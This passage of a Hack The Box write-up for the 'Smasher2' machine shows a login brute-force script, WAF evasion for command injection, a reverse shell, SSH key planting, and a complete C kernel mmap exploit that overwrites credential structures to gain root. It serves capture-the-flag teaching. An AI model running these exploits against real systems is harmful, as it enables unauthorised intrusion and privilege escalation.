                <span class="k">print</span><span class="p">(</span><span class="s">"Skipping... %s"</span> <span class="o">%</span> <span class="n">passwords</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
                <span class="k">break</span>
    <span class="k">if</span> <span class="p">(</span><span class="ow">not</span> <span class="s">"Cannot authenticate with data"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">bad</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">):</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"Potential password! %s"</span> <span class="o">%</span> <span class="n">passwords</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"out.txt"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">passwords</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</code></pre></div></div>

<p>Eventually, I found that the username <code class="language-plaintext highlighter-rouge">Administrator</code> is the right one (case-sensitive):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python brute.py 
Testing username: admin
Testing username: administrator
Testing username: operator
Testing username: sql
Testing username: demo
Testing username: pos
Testing username: user
Testing username: default
Testing username: defaultaccount
Testing username: account
Testing username: accounting
Testing username: guest
Testing username: guest
Testing username: adm
Testing username: office
Testing username: manager
Testing username: Admin
Testing username: Administrator
Potential password! Administrator
</code></pre></div></div>

<p>I can now log in and get an API key:</p>

<p><img src="/assets/images/htb-writeup-smasher2/apikey.png" alt="" /></p>

<h2 id="waf-evasion-then-rce">WAF evasion then RCE</h2>

<p>Using the <code class="language-plaintext highlighter-rouge">/api/&lt;key&gt;/job</code> API, I can execute some commands like <code class="language-plaintext highlighter-rouge">whoami</code>:</p>

<p><img src="/assets/images/htb-writeup-smasher2/rce1.png" alt="" /></p>

<p>However there is a WAF configured because the following commands are blocked and the server returns a 403 Forbidden:</p>

<ul>
  <li>most UNIX commands (ls, cat, etc.)</li>
  <li>multiple commands separated with a semi colon (ie. whoami;whoami)</li>
  <li>multiple commands separated with an ampersand (ie. whoami&amp;&amp;whoami)</li>
  <li>multiple commands separated by spaces</li>
  <li>and a bunch of others</li>
</ul>

<p>Instead of using <code class="language-plaintext highlighter-rouge">ls</code>, I can do <code class="language-plaintext highlighter-rouge">echo *</code> or <code class="language-plaintext highlighter-rouge">echo ../../../../*</code> to use path traversal and walk the entire file system.</p>

<p><img src="/assets/images/htb-writeup-smasher2/rce2.png" alt="" /></p>

<p>I was able to find the home directory of user <code class="language-plaintext highlighter-rouge">dzonerzy</code>.</p>

<p><img src="/assets/images/htb-writeup-smasher2/rce3.png" alt="" /></p>

<p>To read the flag I used the <code class="language-plaintext highlighter-rouge">tac</code> command which was not blacklisted. Itâs basically the same as <code class="language-plaintext highlighter-rouge">cat</code> but lists the content of the file in reverse order.</p>

<p><img src="/assets/images/htb-writeup-smasher2/rce4.png" alt="" /></p>

<p>After some experimentation I found that the <code class="language-plaintext highlighter-rouge">printf</code> command is allowed and that hex encoded characters are permitted. Weâre also allowed to redirect the output to files so I now have a way to write arbitrary data to files without being intercepted by the WAF.</p>

<p>So I encoded the following shell script with CyberChef:</p>

<p><img src="/assets/images/htb-writeup-smasher2/rce5.png" alt="" /></p>

<p>Then I wrote the script to the server using <code class="language-plaintext highlighter-rouge">printf</code>:</p>

<p><img src="/assets/images/htb-writeup-smasher2/rce6.png" alt="" /></p>

<p>And made it executableâ¦</p>

<p><img src="/assets/images/htb-writeup-smasher2/rce7.png" alt="" /></p>

<p>Then executed it and I finally got a shell</p>

<p><img src="/assets/images/htb-writeup-smasher2/rce8.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 4444
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.135.
Ncat: Connection from 10.10.10.135:51882.
id
uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
python -c 'import pty;pty.spawn("/bin/bash")'
dzonerzy@smasher2:~/smanager$
</code></pre></div></div>

<p>After getting a shell, I dropped my RSA public key into <code class="language-plaintext highlighter-rouge">authorized_keys</code> so I could use a regular SSH session:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:~$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQ
ABAAABAQC+SZ75RsfVTQxRRbezIJn+bQgNifXvjMWfhT1hJzl/GbTbykF
...
tGPTwuiA5NAcPKPG25jkQln3J8Id2ngappH2jeDg89 root@ragingunicorn" &gt; .ssh/authorized_keys
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ssh dzonerzy@10.10.10.135
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * 'snap info' now shows the freshness of each channel.
   Try 'snap info microk8s' for all the latest goodness.

Last login: Fri Feb 15 22:05:15 2019
dzonerzy@smasher2:~$ id
uid=1000(dzonerzy) gid=1000(dzonerzy) groups=1000(dzonerzy),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
</code></pre></div></div>

<h2 id="root-privesc">Root privesc</h2>

<p>After searching for a while I found a custom kernel module here:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">./modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko</code></li>
</ul>

<p>This is clearly the target since the box creatorâs name is the module info:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ modinfo ./modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
filename:       /lib/./modules/4.15.0-45-generic/kernel/drivers/hid/dhid.ko
version:        1.0
description:    LKM for dzonerzy dhid devices
author:         DZONERZY
license:        GPL
srcversion:     974D0512693168483CADFE9
depends:        
retpoline:      Y
name:           dhid
vermagic:       4.15.0-45-generic SMP mod_unload
</code></pre></div></div>

<p>We can see that the module has already been loaded:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/lib$ lsmod | grep dhid
dhid                   16384  0
dzonerzy@smasher2:/lib$ dmesg | grep dhid
[   10.110988] dhid: loading out-of-tree module taints kernel.
[   10.111020] dhid: module verification failed: signature and/or required key missing - tainting kernel

dzonerzy@smasher2:/lib$ ls -l /dev/dhid
crwxrwxrwx 1 root root 243, 0 Jun  6 01:09 /dev/dhid
</code></pre></div></div>

<p>I am not very familiar with the way Linux kernel modules work so I had to google a bit. I noticed that there is <code class="language-plaintext highlighter-rouge">dev_read</code> function but no <code class="language-plaintext highlighter-rouge">dev_write</code> function, so itâs unlikely we have to do some kind of buffer overflow.</p>

<p><img src="/assets/images/htb-writeup-smasher2/kernel1.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">dev_read</code> function seems to return only a simple string, it doesnât do anything else.</p>

<p><img src="/assets/images/htb-writeup-smasher2/kernel2.png" alt="" /></p>

<p>To test this, I used the program below that just opens a file description on the <code class="language-plaintext highlighter-rouge">dhid</code> device and read from it.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;errno.h&gt;
#include&lt;fcntl.h&gt;
#include&lt;string.h&gt;
#include&lt;unistd.h&gt;
</span> 
<span class="cp">#define BUFFER_LENGTH 256 // The buffer length (crude but fine)
</span><span class="k">static</span> <span class="kt">char</span> <span class="n">receive</span><span class="p">[</span><span class="n">BUFFER_LENGTH</span><span class="p">];</span> <span class="c1">// The receive buffer from the LKM</span>
 
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">ret</span><span class="p">,</span> <span class="n">fd</span><span class="p">;</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/dhid"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span> <span class="c1">// Open the device with read/write access</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Failed to open the device..."</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">errno</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">receive</span><span class="p">,</span> <span class="n">BUFFER_LENGTH</span><span class="p">);</span> <span class="c1">// Read the response from the LKM</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"Failed to read the message from the device."</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">errno</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"The received message is: [%s]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">receive</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"End of the program</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>As expected, it returns the string and simply exits:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/dev/shm$ gcc -o test test.c
dzonerzy@smasher2:/dev/shm$ ./test
The received message is: [This is the right way, please exploit this shit!]
End of the program
</code></pre></div></div>

<p>Thereâs an interesting paper from MWR Lab about <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-mmap-exploitation-whitepaper-2017-09-18.pdf">Kernel Driver mmap Handler Exploitation</a> that apply to the custom kernel module here.</p>

<p>The gist of it is if the mmap handler in the module doesnât perform proper validation of parameters then we can map all the physical memory of the system from a program then read/write kernel memory from user space. This allows an attacker to read sensitive data and/or change credential structures. In this case, I want to change the privileges of the <code class="language-plaintext highlighter-rouge">dzonerzy</code> user to become root.</p>

<p>The decompiled code for <code class="language-plaintext highlighter-rouge">dev_mmap</code> right next to the whitepaper code example:</p>

<p><img src="/assets/images/htb-writeup-smasher2/kernel3.png" alt="" /></p>

<p>The whitepaper contains an exploit code that search the memory space for credential structures then modify it to give root access.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
#include&lt;stdlib.h&gt;
#include&lt;errno.h&gt;
#include &lt;sys/mman.h&gt;
#include&lt;fcntl.h&gt;
#include&lt;string.h&gt;
#include&lt;unistd.h&gt;
#include &lt;pthread.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="k">const</span> <span class="o">*</span> <span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] PID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">getpid</span><span class="p">());</span>
	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/dhid"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Open failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Open OK fd: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="mh">0xf0000000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmapStart</span> <span class="o">=</span> <span class="mh">0x42424000</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span> <span class="n">addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">mmapStart</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">addr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"Failed to mmap: "</span><span class="p">);</span>
		<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] mmap OK addr: %lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">);</span>
	
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] UID: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">credNum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">while</span> <span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">addr</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">mmapStart</span> <span class="o">+</span> <span class="n">size</span> <span class="o">-</span> <span class="mh">0x40</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span>
		<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
		<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
		<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
		<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
		<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
		<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
		<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span> <span class="o">&amp;&amp;</span>
		<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">==</span> <span class="n">uid</span>
		<span class="p">)</span>
		<span class="p">{</span>
			<span class="n">credNum</span><span class="o">++</span><span class="p">;</span>
			<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Found cred structure! ptr: %p, credNum: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">credNum</span><span class="p">);</span>
			<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="n">puts</span><span class="p">(</span><span class="s">"[+] GOT ROOT!"</span><span class="p">);</span>
				<span class="n">credIt</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//Skip 4 bytes, to get capabilities</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff</span><span class="p">;</span>
				<span class="n">execl</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span>
				<span class="n">puts</span><span class="p">(</span><span class="s">"[-] Execl failed..."</span><span class="p">);</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="k">else</span>
			<span class="p">{</span>
				<span class="n">credIt</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
				<span class="n">addr</span><span class="p">[</span><span class="n">credIt</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="n">addr</span><span class="o">++</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"[+] Scanning loop END"</span><span class="p">);</span>
	<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
	
	<span class="kt">int</span> <span class="n">stop</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>After compiling and running the code, we get root access:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dzonerzy@smasher2:/dev/shm$ gcc -w -o exploit exploit.c
dzonerzy@smasher2:/dev/shm$ ./exploit
[+] PID: 15475
[+] Open OK fd: 3
[+] mmap OK addr: 42424000
[+] UID: 1000
[+] Found cred structure! ptr: 0x763600c4, credNum: 1
[+] Found cred structure! ptr: 0x76360544, credNum: 2
[+] Found cred structure! ptr: 0x76360cc4, credNum: 3
[+] Found cred structure! ptr: 0x76361444, credNum: 4
[+] Found cred structure! ptr: 0x76361b04, credNum: 5
[+] Found cred structure! ptr: 0x76361bc4, credNum: 6
[+] Found cred structure! ptr: 0x76361e04, credNum: 7
[+] Found cred structure! ptr: 0x76c4af04, credNum: 8
[+] GOT ROOT!
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare),1000(dzonerzy)

# cat /root/root.txt
7791e0...
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#bruteforce" class="page__taxonomy-item" rel="tag">bruteforce</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#kernel-module" class="page__taxonomy-item" rel="tag">kernel module</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">python</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#re" class="page__taxonomy-item" rel="tag">re</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#sqli" class="page__taxonomy-item" rel="tag">sqli</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#waf" class="page__taxonomy-item" rel="tag">waf</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-12-14T00:00:00+01:00">December 14, 2019</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-wall/" class="pagination--pager" title="Wall - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-craft/" class="pagination--pager" title="Craft - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
